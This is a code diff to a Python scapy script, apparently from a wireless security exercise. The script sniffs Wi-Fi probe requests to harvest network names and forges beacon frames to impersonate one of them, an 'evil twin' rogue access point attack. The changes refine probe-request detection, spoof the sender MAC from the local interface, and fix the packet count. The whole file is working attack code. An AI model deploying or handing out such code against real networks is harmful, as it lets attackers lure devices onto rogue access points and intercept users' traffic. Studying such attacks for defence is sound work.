@@ -1,8 +1,9 @@
 #!/bin/python3
 import argparse
 
+import netifaces
 from scapy.all import *
-from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap
+from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11ProbeReq
 
 SSIDs = []
 
@@ -12,14 +13,12 @@ def packet_handler(p):
     Packet handler to analyse active Probe requests and discover new ssids
     :param p: the packet to analyse
     """
-    if p.haslayer(Dot11):
-        # Check for Probe requests
-        if p.type == 0 and p.subtype == 4:
-            ssid = p.info.decode("utf-8")
-            # Null probe requests are discarded
-            if ssid != "" and ssid not in SSIDs:
-                SSIDs.append(ssid)
-                print(ssid)
+    if p.haslayer(Dot11ProbeReq):
+        ssid = p.info.decode("utf-8")
+        # Null probe requests are discarded
+        if ssid != "" and ssid not in SSIDs:
+            SSIDs.append(ssid)
+            print(ssid)
 
 
 def search_ssid():
@@ -51,9 +50,11 @@ def forge_packet(ssid):
     # fix channel to 11
     channel = 11
 
+    interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]
+
     # forge beacon packet
     packet = RadioTap() \
-             / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=args.BSSID, addr3=args.BSSID) \
+             / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=interface[0]['addr'], addr3=interface[0]['addr'] if not args.BSSID else args.BSSID) \
              / Dot11Beacon(cap="ESS+privacy") \
              / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) \
              / Dot11Elt(ID="DSset", info=chr(channel))
@@ -73,7 +74,7 @@ def evil_twin_probe_request():
     if len(SSIDs) != 0:
         selected_ssid = select_ssid()
         forged_beacon = forge_packet(selected_ssid)
-        sendp(forged_beacon, iface=args.Interface, count=args.Packets)
+        sendp(forged_beacon, iface=args.Interface, count=int(args.Packets))
     else:
         print("No SSIDs found in active probe requests...Try again...")
 
